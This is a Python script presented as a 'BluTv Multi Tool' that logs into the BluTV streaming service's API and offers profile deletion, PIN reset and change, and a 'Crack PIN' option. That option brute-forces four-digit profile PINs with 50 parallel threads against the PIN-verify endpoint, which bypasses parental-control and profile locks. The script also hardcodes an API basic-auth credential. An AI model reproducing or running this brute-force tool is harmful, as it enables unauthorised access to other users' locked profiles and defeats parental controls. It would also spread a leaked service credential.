from typing import List, Optional, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed

import os
try:
    import requests
    from colorama import Fore, Style, init
except:
    os.system("pip install requests")
    os.system("pip install colorama")
    import requests

init(autoreset=True)

session = requests.Session()
stop_searching = False

@dataclass
class Profile:
    id: str
    image: Optional[str]
    name: str
    type: str
    is_account_owner: bool
    parent_control: dict
    has_pin: bool
    membership_id: str


def login(mail: str, passw: str) -> Tuple[str, str]:
    login_url = "https://adapter.blupoint.io/api/projects/60b0e14f617db52ab1867f78/login"
    login_data = {
        "username": mail,
        "password": passw,
    }

    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
        'AppPlatform': "com.blu",
        'Authorization': "Basic 6194ab670ef961002d079833:lQOD4sgX0WaH5aeokfMXnPvZ1heIowsi"
    }

    response = session.post(url=login_url, json=login_data, headers=headers).json()
    return response["AccessToken"], response["RefreshToken"]

def fetch_profiles(access_token: str, refresh_token: str) -> List[Profile]:
    profiles_url = f"https://adapter.blupoint.io/api/projects/60b0e14f617db52ab1867f78/get-profiles?accessToken={access_token}&refreshToken={refresh_token}"
    profiles_data = session.get(profiles_url).json()

    profiles = [
        Profile(
            id=profile["_id"],
            image=profile["image"],
            name=profile["name"],
            type=profile["type"],
            is_account_owner=profile["is_account_owner"],
            parent_control=profile["parent_control"],
            has_pin=profile["has_pin"],
            membership_id=profile["membership_id"]
        )
        for profile in profiles_data["profiles"]
    ]
    return profiles

def delete_profile(profile: Profile):
    if profile.is_account_owner:
        print(Fore.RED + "Can't delete account owner profile")
        return

    delete_url = f"https://adapter.blupoint.io/api/projects/60b0e14f617db52ab1867f78/delete-profile?profileId={profile.id}"
    response = session.get(delete_url)
    if response.status_code == 200:
        print(Fore.GREEN + f"Deleted profile: {profile.name} ({profile.id})")
    else:
        print(Fore.RED + f"Failed to delete profile: {profile.name} ({profile.id})")

def reset_profile_pin(profile: Profile):
    reset_url = f"https://adapter.blupoint.io/api/projects/60b0e14f617db52ab1867f78/reset-pin?profileId={profile.id}"
    response = session.get(reset_url)
    if response.status_code == 200:
        print(Fore.GREEN + f"New pin is '0000' for profile: {profile.name} ({profile.id})")
    else:
        print(Fore.RED + f"Failed to reset pin: {profile.name} ({profile.id})")

def change_profile_pin(profile: Profile, pin: str):
    payload = {
        "parent_control": profile.parent_control,
        "name": profile.name,
        "image": profile.image,
        "type": profile.type,
        "pin": pin
    }

    update_url = f"https://adapter.blupoint.io/api/projects/60b0e14f617db52ab1867f78/update-profile?profileId={profile.id}"
    response = session.post(update_url, json=payload)
    if response.status_code == 200:
        print(Fore.GREEN + f"Changed pin to {pin} for profile: {profile.name} ({profile.id})")
    else:
        print(Fore.RED + f"Failed to set pin: {profile.name} ({profile.id})")

def post_pin(id: str, pin: int) -> Optional[int]:
    global stop_searching
    if stop_searching:
        return None

    url = f"https://adapter.blupoint.io/api/projects/60b0e14f617db52ab1867f78/profile-pin-verify?profileId={id}"
    response = session.post(url, json={"pin": f"{pin}"})
    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("verified") is True:
            print(Fore.GREEN + f"PIN found: {pin}")
            stop_searching = True
            return pin
    elif response.status_code == 403:
        return None
    print(Fore.RED + f"Error occurred with PIN: {pin}")
    return None

def find_pin(id):
    global stop_searching
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(post_pin, id, pin): pin for pin in range(1000, 9999)}
        for future in as_completed(futures):
            if future.result() is not None:
                print(Fore.GREEN + "Stopped searching, correct pin found.")
                stop_searching = True
                break
        else:
            if not stop_searching:
                print(Fore.RED + "PIN not found.")

def main():

    print(f"""  {Fore.RED}                                                

██████╗░ ███████╗ ██████╗░ ██╗░░██╗
██╔══██╗ ██╔════╝ ██╔══██╗ ╚██╗██╔╝
██████╔╝ █████╗░░ ██║░░██║ ░╚███╔╝░
██╔══██╗ ██╔══╝░░ ██║░░██║ ░██╔██╗░
██║░░██║ ███████╗ ██████╔╝ ██╔╝╚██╗
╚═╝░░╚═╝ ╚══════╝ ╚═════╝░ ╚═╝░░╚═╝

BluTv Multi Tool {Fore.RESET}- {Fore.RED}FuryLemons 

""")

    mail = input(f"{Fore.RED} Mail-> {Fore.RESET} ")
    passw = input(f"{Fore.RED} Password-> {Fore.RESET} ")

    access_token, refresh_token = login(mail, passw)

    headers = {
        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
        'AppPlatform': "com.blu",
        'AuthorizationToken': access_token,
        'Authorization': "Basic 6194ab670ef961002d079833:lQOD4sgX0WaH5aeokfMXnPvZ1heIowsi"
    }

    session.headers = headers

    profiles = fetch_profiles(access_token, refresh_token)
    profile_names = [profile.name for profile in profiles]

    while True:
        selected_name = input(Fore.CYAN + f"Enter the profile name: ({', '.join(profile_names)}): ")
        selected_profile = next((profile for profile in profiles if profile.name == selected_name), None)

        if not selected_profile:
            print(Fore.RED + "Invalid profile name")
            return

        print(Fore.RED + f"Selected profile: {selected_profile.name}")
        print(Fore.RED + "1. Delete profile")
        print(Fore.RED + "2. Reset profile pin")
        print(Fore.RED + "3. Change profile pin")
        print(Fore.RED + "4. Crack PIN")

        choice = input(Fore.CYAN + "Enter your choice (1, 2, 3, or 4): ")

        if choice == "1":
            delete_profile(selected_profile)
        elif choice == "2":
            reset_profile_pin(selected_profile)
        elif choice == "3":
            new_pin = input(Fore.CYAN + "Enter new pin: ")
            change_profile_pin(selected_profile, new_pin)
        elif choice == "4":
            find_pin(selected_profile.id)
        else:
            print(Fore.RED + "Invalid choice")

if __name__ == "__main__":
    main()